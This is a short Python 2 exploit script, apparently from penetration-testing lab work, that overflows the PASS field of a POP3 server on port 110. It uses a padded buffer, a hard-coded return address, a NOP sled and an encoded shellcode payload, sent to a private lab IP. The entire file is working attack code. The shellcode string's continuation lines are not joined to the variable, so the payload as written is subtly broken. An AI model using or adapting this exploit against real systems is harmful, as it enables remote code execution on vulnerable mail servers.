#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode ="\xdb\xd0\xd9\x74\x24\xf4\x58\xba\x95\x2a\xd7\xf7\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x13\x03\xc5\x39\x35\x02\x19\xd5\x3b"
"\xed\xe1\x26\x5c\x67\x04\x17\x5c\x13\x4d\x08\x6c\x57\x03\xa5"
"\x07\x35\xb7\x3e\x65\x92\xb8\xf7\xc0\xc4\xf7\x08\x78\x34\x96"
"\x8a\x83\x69\x78\xb2\x4b\x7c\x79\xf3\xb6\x8d\x2b\xac\xbd\x20"
"\xdb\xd9\x88\xf8\x50\x91\x1d\x79\x85\x62\x1f\xa8\x18\xf8\x46"
"\x6a\x9b\x2d\xf3\x23\x83\x32\x3e\xfd\x38\x80\xb4\xfc\xe8\xd8"
"\x35\x52\xd5\xd4\xc7\xaa\x12\xd2\x37\xd9\x6a\x20\xc5\xda\xa9"
"\x5a\x11\x6e\x29\xfc\xd2\xc8\x95\xfc\x37\x8e\x5e\xf2\xfc\xc4"
"\x38\x17\x02\x08\x33\x23\x8f\xaf\x93\xa5\xcb\x8b\x37\xed\x88"
"\xb2\x6e\x4b\x7e\xca\x70\x34\xdf\x6e\xfb\xd9\x34\x03\xa6\xb5"
"\xf9\x2e\x58\x46\x96\x39\x2b\x74\x39\x92\xa3\x34\xb2\x3c\x34"
"\x3a\xe9\xf9\xaa\xc5\x12\xfa\xe3\x01\x46\xaa\x9b\xa0\xe7\x21"
"\x5b\x4c\x32\xe5\x0b\xe2\xed\x46\xfb\x42\x5e\x2f\x11\x4d\x81"
"\x4f\x1a\x87\xaa\xfa\xe1\x40\xdf\xf1\xe9\x5b\xb7\x07\xe9\x5a"
"\xf3\x81\x0f\x36\x13\xc4\x98\xaf\x8a\x4d\x52\x51\x52\x58\x1f"
"\x51\xd8\x6f\xe0\x1c\x29\x05\xf2\xc9\xd9\x50\xa8\x5c\xe5\x4e"
"\xc4\x03\x74\x15\x14\x4d\x65\x82\x43\x1a\x5b\xdb\x01\xb6\xc2"
"\x75\x37\x4b\x92\xbe\xf3\x90\x67\x40\xfa\x55\xd3\x66\xec\xa3"
"\xdc\x22\x58\x7c\x8b\xfc\x36\x3a\x65\x4f\xe0\x94\xda\x19\x64"
"\x60\x11\x9a\xf2\x6d\x7c\x6c\x1a\xdf\x29\x29\x25\xd0\xbd\xbd"
"\x5e\x0c\x5e\x41\xb5\x94\x6e\x08\x97\xbd\xe6\xd5\x42\xfc\x6a"
"\xe6\xb9\xc3\x92\x65\x4b\xbc\x60\x75\x3e\xb9\x2d\x31\xd3\xb3"
"\x3e\xd4\xd3\x60\x3e\xfd"




# 5F4A358F
# bad char = '\x00\x0a\x0d'

buffer ='A'*2606 + '\x8f\x35\x4a\x5F' + '\x90'*16 + shellcode + 'C'*(3500-2606-4-351-16)
try:
	print "Fuzzing PASS with %s bytes: " % len(buffer)	
	connect=s.connect(('10.11.16.6',110))
	s.recv(1024)
	s.send('USER username\r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
        print "\nDone!\r\n"

except:
        print "Could not connect to POP3\n"
